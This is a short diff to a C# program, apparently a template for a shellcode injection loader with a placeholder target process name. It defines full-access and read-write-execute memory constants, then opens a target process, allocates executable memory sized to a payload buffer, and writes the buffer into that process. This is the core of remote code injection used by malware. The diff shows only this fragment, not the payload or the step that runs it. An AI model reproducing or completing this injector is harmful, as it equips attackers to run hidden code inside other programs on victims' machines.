@@ -9,6 +9,10 @@ namespace Craft
 {
     public class Program
     {
+        public const uint EXECUTEREADWRITE  = 0x40;
+        public const uint COMMIT_RESERVE = 0x3000;
+        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
+        
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
@@ -30,8 +34,8 @@ namespace Craft
 
             int pid = Process.GetProcessesByName("{{PROCESS}}")[0].Id;
 
-            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
 
             IntPtr outSize;
             WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
